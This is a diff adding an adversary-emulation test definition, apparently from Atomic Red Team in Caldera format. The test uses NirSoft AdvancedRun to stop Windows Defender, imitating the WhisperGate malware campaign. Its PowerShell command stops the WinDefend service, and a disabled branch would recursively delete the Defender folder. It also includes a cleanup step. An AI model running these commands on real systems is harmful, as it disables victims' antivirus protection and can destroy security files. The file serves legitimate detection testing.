@@ -1,0 +1,30 @@
+---
+- id: 0402c74f97e712d03605175c5ba9675b
+  name: Disable Defender Using NirSoft AdvancedRun
+  description: "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\n\
+    This Atomic will run AdvancedRun.exe with similar behavior identified during the\
+    \ WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\n\
+    Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender,\
+    \ and optionally attempt to delete the Defender folder on disk. \n"
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: Try {cmd /c "PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe"
+          /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine
+          "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}; if(0){;   $CommandToRun
+          = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse;   Try {cmd
+          /c "PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe" /EXEFilename
+          "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState
+          0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{};
+          }
+        payloads: []
+        cleanup: Try {cmd /c "PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe"
+          /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine
+          "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
